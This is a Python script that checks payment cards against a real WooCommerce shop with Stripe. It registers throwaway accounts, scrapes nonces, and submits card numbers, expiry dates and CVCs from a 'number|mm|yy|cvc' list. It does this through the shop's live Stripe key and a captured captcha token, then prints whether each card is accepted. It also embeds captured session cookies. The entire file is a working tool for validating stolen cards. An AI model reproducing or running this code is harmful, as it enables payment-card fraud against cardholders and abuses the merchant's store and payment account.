import requests, re
import time
import random
import string
from threading import Thread, Lock
from queue import Queue

# Lock for thread-safe printing
print_lock = Lock()

def generate_random_account():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + ''.join(random.choices(string.digits, k=4)) + '@yahoo.com'

acc = generate_random_account()


def Tele(ccx):
    import requests
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    r = requests.session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://3dprintedprops.com/my-account/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2F',
    }

    response = requests.get('https://3dprintedprops.com/my-account/', headers=headers)

    nonce = re.search(r'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([^*]+)" /><input type="hidden"', response.text).group(1)
    # nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://3dprintedprops.com',
        'priority': 'u=0, i',
        'referer': 'https://3dprintedprops.com/my-account/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2F',
    }

    data = {
        'email': acc,
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://3dprintedprops.com/',
        'wc_order_attribution_session_start_time': '2025-05-29 08:33:06',
        'wc_order_attribution_session_pages': '10',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    response = requests.post('https://3dprintedprops.com/my-account/', headers=headers, data=data)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'priority': 'u=0, i',
        'referer': 'https://3dprintedprops.com/my-account/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7c8fd66723dda58e67a3ffadfab8ca45=noemail-4692%7C1749721214%7CLFM1CvsXMNxTa8MWGwEzgJf6dEAco2lnsnSsV3g1AwD%7C6efb17f4415685ec36e25b7a163654ce36324f91519dc02f7f82188fdc1aa015; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2Fedit-address%2F',
    }

    response = requests.get('https://3dprintedprops.com/my-account/payment-methods/', headers=headers)

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'priority': 'u=0, i',
        'referer': 'https://3dprintedprops.com/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7c8fd66723dda58e67a3ffadfab8ca45=noemail-4692%7C1749721214%7CLFM1CvsXMNxTa8MWGwEzgJf6dEAco2lnsnSsV3g1AwD%7C6efb17f4415685ec36e25b7a163654ce36324f91519dc02f7f82188fdc1aa015; sbjs_session=pgs%3D23%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2Fpayment-methods%2F',
    }

    response = requests.get('https://3dprintedprops.com/my-account/add-payment-method/', headers=headers)

    nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text).group(1)

    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=87121&billing_details[address][country]=US&pasted_fields=number&payment_user_agent=stripe.js%2Fba4e3767a2%3B+stripe-js-v3%2Fba4e3767a2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2F3dprintedprops.com&time_on_page=62862&client_attribution_metadata[client_session_id]=c4fc161d-5ba8-40b3-a882-b0155b9f224e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=1f1e2e34-b66f-4f87-b974-e386ae6df3112e2fed&muid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43&sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887&key=pk_live_51GiQFjLBjXqlell7lfU5IpkR2WZs6MwM87yxrXYvlt27hZupCjijGdsGbtnv2UAZ3tjnSKCuJ77Pub5opEuilU4Z00W20xrwRS&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzQ4NTEyMTc4LCJjZGF0YSI6Ik9zMUpYMjB0a1Y5VU10RG1GWFZWalMyb2QzUEdpZGphZlFhRGZGWEtVN0EwZnY4ZkNmMEpXYjFZL2wzWWYwcWluTGc0V091OEtLWkVnclcySUJ0WXR6SmJvRXA0bVdPQkY3OFVTbFdKNTRKR29YZ1FFSVBSeFdJakJlVU1WamJFUXNTeHdZdWV2WDIvdFNLR2lnSlNScHkxdGVYb0puUjNSUnQzMklaQ3oyRCtOZWQ4LzJZSzhqNlFzRFFHTnhIU29nWjhiL3dBRldlMFRWRlIiLCJwYXNza2V5IjoiZTJndUhaZmUzNEIyenpTRGFQZm9MMlRrcVhxL0txd0R4YWJSNXErTDFnRDVJN3RIb09UeFVycmFOZEpVTDhtYjcwdkpzdzJrdkFnNXg5ZTgwaWNPRlJGQ3RvT0REamNLUUtYOTdrZUNiNUFnaVRrcURNUVFZWXFXQkc5amNDSFdSY0xSU2FTVUd3c1V5Q2FXcHlIc1ZIMXZWQWE4OWlLSTRvb2Z1Vjd3SzI4OU5YNWdaYkk2QVB4OEJJYURmcVlKdHlHdTJ0aHlKVGZIUzNjYXI3TFRoelFxV0Z4TlFiY3d3ZzJVVFNQS2JwZGFidmVuT1pUM2EvbFBTdDk0TWpQY3RUVVAvbWx5QkZWeHFsbXN5RHFoVXBUTDhkN090YTYwMHp5QUVRRHp0dk54SHphSEdJQmNTNWN4T1pJNGV1bU5SWFhiTXBZQTNNdjA5YzIzNTJ5bThyZk9mYklBK01KUFYwREJtcUlGNzA5Wk1BS09SbE83MDJsTDk5SHU5d2JwaGJhVTB3TXBMWUlqUzJoOHorSXNabGR5c0IyTy9ocFd3M2xHeHZIZUpRNmxudW1JemhYYXVKdnVZbGNoNFpXY2pNV2lHQWJSMzhpU0JTMmhGK29vSGZvV29TZkZtdkt3VzF3aEI5d2Y1R2lDR0QrNGhDL1lQSWdwRXpHejVSYk1NQWpyTlpuNjVOVGpwRlkwc0pXMncyREhkNDdTMk05bHkyR29EZXVPOEc0RU5WR2pFK3lUT1k5dThnWVZ0SExRMDFmZk03a1QwV3FlQ0xLdHV3WVVxUC9HNWpmanNjb0VLdEtqUjVPMVFkRkRET0VtQzN1ZmlXaGRDNjBMaDNkT2wwaGg5ZStIMk1RcXR4cmp6MEtNd2o1Z0NZdWNOOTBZRWZsMUhFMnZmQTFINWpiMU4yNlRieFlvamJOZk9JcDJ1S2NCL25VSnJoVlZhMzh1YnoxMWV3eWwzWUQvdnEzVFd0VXB2blFWYXN2ZUJjNVh5SVBOb0hQUklNMEFCWVRtMFdua0kwNHJWR0RTdlg4TGZjdkJURXJhUE12RkJ4YjB3by9QMis0MTRLOGs1MkdQY01waUhleXB3cHBMWmg4K1RFMFZ3bmdKc2VrUFdSMm5DUStLTURGd1p4TUd6TnNFUnFoNENpdGpKUDU4NytOS0lwT1VnYWc5TjFON0Rmc3M4aUY5UW9XeWRiUFllN09tYzFES0daM1RqTnQ1OExBQ01WaTBpK1JoMVloMk1sa3VFcFBQd2JQVVBsL29BZ1hSNkJUNE0wSlJld3VoRUwzWTA2WlNNNU9DOUVZenZhWmRtSWRnbWlia25HR2ptNVJ6L1dRZ25kSm93dnZjTkx6cS83K0FqQU9KQThqMmh0blFsdjc3ZVRPUnZOVU1FeUxtYUE1V3F6WkV5U3M1eGp6UnZnT2xHRFdRN09xRjNjd0ZTYmNEbFVuTEpuZ25TRlcxT21vSWNaNWptcEhPU0VGS1crZzlLakhZd3NoSXRwRHVJTEFPZU15aEFhc0RBQVM1b2ZGdHRwbldYODc1cHFwTmdtVUgyN1pGUTRVdW1kdHVuSVluY1RSbk14emRnMDFwOG5IZ0RFNFNMbzFGWnlxVWNHWXV3ZXNXdDZIZTFydVJER3NIRmErbU9ockxqNC9OR1JWWFZwYUh6dUl6NWJUdTdTY0M1aVFJUEQwVzVxYUNrYW14ZEVMVHlWVmRjRTRYMVRSaWlDemd5K1dYV1BXSE5EaWtlb3NReDZ2SWl1QzViUlBqT2xUd3RsWmVRdUYxeExIM2t2UXdXT2RXYjJCYzN1ZTZJVjhqdkhwaWhmdEFzc0IzVENtWnJCcFlxazJwR1ZPWTlqNE1PQWIwOFVIem15QW56N0VFMmdlVnVUTFNCb29Jb1RFRzVZL25rSkRHSzlrQXdCajI5SXlMaVFUS3BMd0xEV3ZHZkh0c0xyR0VNQUthYmpFOXQzanpkMWJCdUFRdGZQRSs3azM4bE9ZbGpKMzAxZDZqVjFRSGE1cUc0RFQ4a1RuRHErUHlackxzbjUzWWtRQ0ZiR2ZiQjFsVHgzWTY3SHVBRUlUS2ZJYnpUUVV2SytScGJmbjNMcVNQaTd4QXB1eklKVUhiTVFTMkI1cUFPcHVoTzBtUVovcHlBekhBb1NVPSIsImtyIjoiNDMyNDc1ZGIiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.2OOglzI9fNsGZ-aZe_m9UP26Np_nVAMvQSEF__ABoc0'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    pm = response.json()["id"]

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://3dprintedprops.com',
        'priority': 'u=1, i',
        'referer': 'https://3dprintedprops.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-05-29%2008%3A33%3A06%7C%7C%7Cep%3Dhttps%3A%2F%2F3dprintedprops.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F136.0.0.0%20Safari%2F537.36; __stripe_mid=a5c7f57a-d956-4d28-8095-c8c7a6944acc53ba43; __stripe_sid=73b25042-9635-4ec3-b0c3-48561d986b456d9887; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_7c8fd66723dda58e67a3ffadfab8ca45=noemail-4692%7C1749721214%7CLFM1CvsXMNxTa8MWGwEzgJf6dEAco2lnsnSsV3g1AwD%7C6efb17f4415685ec36e25b7a163654ce36324f91519dc02f7f82188fdc1aa015; sbjs_session=pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2F3dprintedprops.com%2Fmy-account%2Fadd-payment-method%2F',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }

    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce_match,
    }

    response = requests.post('https://3dprintedprops.com/', params=params, headers=headers, data=data)
    print(f"{n}|{cvc}|{mm}|{yy}: ",response.text)
    return response.json()

